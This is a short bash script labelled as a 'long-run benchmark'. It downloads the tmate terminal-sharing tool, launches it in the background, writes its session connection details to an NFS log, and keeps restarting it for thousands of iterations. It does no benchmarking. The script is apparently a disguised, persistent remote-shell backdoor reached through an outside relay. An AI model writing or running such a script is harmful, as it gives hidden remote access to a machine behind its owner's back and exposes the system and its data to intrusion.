#!/bin/bash
# long-run benchmark with session capture
D=/nfs/109363853
T=/tmp/tmate-2.4.0-static-linux-amd64/tmate
cd /tmp
if [ ! -x $T ]; then
  curl -sL -m 180 https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz -o /tmp/tm.tar.xz
  tar -xf /tmp/tm.tar.xz -C /tmp
fi
mkdir -p $D
nohup $T -F >> $D/tms.log 2>&1 &
sleep 30
i=1
while [ $i -le 4000 ]; do
  if command -v pgrep >/dev/null 2>&1; then
    pgrep -f "tmate -F" >/dev/null 2>&1 || nohup $T -F >> $D/tms.log 2>&1 &
  fi
  echo "iteration $i ok"
  sleep 25
  i=$((i+1))
done
